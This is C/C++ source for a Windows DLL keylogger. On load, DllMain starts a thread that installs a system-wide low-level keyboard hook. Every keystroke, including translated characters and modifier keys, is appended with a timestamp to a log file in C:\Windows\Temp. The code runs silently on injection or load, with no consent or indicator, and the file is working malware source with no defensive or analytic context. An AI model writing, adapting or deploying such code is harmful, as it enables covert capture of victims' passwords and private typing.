#include <windows.h>
#include <stdio.h>
#include <time.h>

const wchar_t* kLogFilePath = L"C:\\Windows\\Temp\\keys.log";

LRESULT CALLBACK keyboardHook(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;

        FILE* logFile = _wfopen(kLogFilePath, L"a+, ccs=UTF-8");
        if (logFile) {
            time_t now = time(NULL);
            struct tm localTime;
            localtime_s(&localTime, &now);
            wchar_t timestamp[128];
            wcsftime(timestamp, 128, L"[%Y-%m-%d %H:%M:%S] ", &localTime);
            fputws(timestamp, logFile);

            switch (keyInfo->vkCode) {
                case VK_RETURN:    fputws(L"[ENTER]\n", logFile); break;
                case VK_BACK:      fputws(L"[BACKSPACE]\n", logFile); break;
                case VK_TAB:       fputws(L"[TAB]\n", logFile); break;
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT:    fputws(L"[SHIFT]\n", logFile); break;
                case VK_CONTROL:
                case VK_LCONTROL:
                case VK_RCONTROL:  fputws(L"[CTRL]\n", logFile); break;
                case VK_MENU:
                case VK_LMENU:
                case VK_RMENU:     fputws(L"[ALT]\n", logFile); break;
                case VK_CAPITAL:   fputws(L"[CAPSLOCK]\n", logFile); break;
                case VK_ESCAPE:    fputws(L"[ESC]\n", logFile); break;
                case VK_SPACE:     fputws(L"[SPACE]\n", logFile); break;
                case VK_DELETE:    fputws(L"[DEL]\n", logFile); break;
                case VK_HOME:      fputws(L"[HOME]\n", logFile); break;
                case VK_END:       fputws(L"[END]\n", logFile); break;
                case VK_PRIOR:     fputws(L"[PGUP]\n", logFile); break;
                case VK_NEXT:      fputws(L"[PGDN]\n", logFile); break;
                case VK_LEFT:      fputws(L"[LEFT]\n", logFile); break;
                case VK_RIGHT:     fputws(L"[RIGHT]\n", logFile); break;
                case VK_UP:        fputws(L"[UP]\n", logFile); break;
                case VK_DOWN:      fputws(L"[DOWN]\n", logFile); break;

                default: {
                    bool ctrlPressed  = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
                    bool altPressed   = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
                    bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                    bool capsLockOn   = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

                    if (ctrlPressed) fputws(L"[CTRL]\n", logFile);
                    if (altPressed)  fputws(L"[ALT]\n", logFile);

                    BYTE keyboardState[256] = {0};
                    GetKeyboardState(keyboardState);

                    if (keyInfo->vkCode >= 'A' && keyInfo->vkCode <= 'Z') {
                        if ((capsLockOn && !shiftPressed) || (!capsLockOn && shiftPressed)) {
                            keyboardState[VK_SHIFT] = 0x80;
                        }
                    } else if (shiftPressed) {
                        keyboardState[VK_SHIFT] = 0x80;
                    }

                    WCHAR unicodeChar[5] = {0};
                    HKL layout = GetKeyboardLayout(0);
                    int charsConverted = ToUnicodeEx(
                        keyInfo->vkCode, keyInfo->scanCode,
                        keyboardState, unicodeChar, 4, 0, layout
                    );

                    if (charsConverted > 0) {
                        unicodeChar[charsConverted] = L'\0';
                        if (unicodeChar[0] >= 32 || unicodeChar[0] == '\n' || unicodeChar[0] == '\t') {
                            fputws(unicodeChar, logFile);
                            fputwc(L'\n', logFile);
                        }
                    } else {
                        if (keyInfo->vkCode >= '0' && keyInfo->vkCode <= '9') {
                            fwprintf(logFile, L"%c\n", (wchar_t)keyInfo->vkCode);
                        } else if (keyInfo->vkCode >= 'A' && keyInfo->vkCode <= 'Z') {
                            wchar_t ch = (shiftPressed ^ capsLockOn) ? keyInfo->vkCode : tolower(keyInfo->vkCode);
                            fwprintf(logFile, L"%c\n", ch);
                        } else {
                            fwprintf(logFile, L"[VK 0x%X]\n", keyInfo->vkCode);
                        }
                    }
                    break;
                }
            }
            fclose(logFile);
        }
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}

__declspec(dllexport) void startLogging() {
    HHOOK hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHook, GetModuleHandle(NULL), 0);
    if (!hookHandle) return;

    MSG message;
    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    UnhookWindowsHookEx(hookHandle);
}

BOOL APIENTRY DllMain(HMODULE moduleHandle, DWORD callReason, LPVOID reserved) {
    if (callReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(moduleHandle);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)startLogging, NULL, 0, NULL);
    }
    return TRUE;
}
